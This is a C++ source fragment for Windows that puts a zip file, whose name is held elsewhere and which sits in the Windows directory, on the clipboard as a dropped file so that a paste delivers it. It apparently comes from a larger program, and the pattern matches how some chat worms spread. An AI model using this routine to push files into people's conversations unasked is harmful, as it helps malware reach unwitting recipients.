#include "includes.h"
//#include "functions.h"
#include "extern.h"
#include "dropfile.h"

void dropfiles(HWND hwnd)
{
    char windir[260];
	char szFiles[260];
	GetWindowsDirectory(windir,sizeof(windir));
	strcat(windir,szZipname);
	memset(szFiles, '\0', sizeof(windir));
	sprintf(szFiles, "%s",windir);

if (::OpenClipboard (hwnd)) {
    ::EmptyClipboard ();
    int nSize = sizeof (DROPFILES) + sizeof (szFiles);
    HANDLE hData = ::GlobalAlloc (GHND, nSize);
    LPDROPFILES pDropFiles = (LPDROPFILES) ::GlobalLock (hData);
    pDropFiles->pFiles = sizeof (DROPFILES);

#ifdef UNICODE
    pDropFiles->fWide = TRUE;
#else
    pDropFiles->fWide = FALSE;
#endif

    LPBYTE pData = (LPBYTE) pDropFiles + sizeof (DROPFILES);
    ::CopyMemory (pData, szFiles, sizeof (szFiles));
    ::GlobalUnlock (hData);
    ::SetClipboardData (CF_HDROP, hData);
    ::CloseClipboard ();
}



}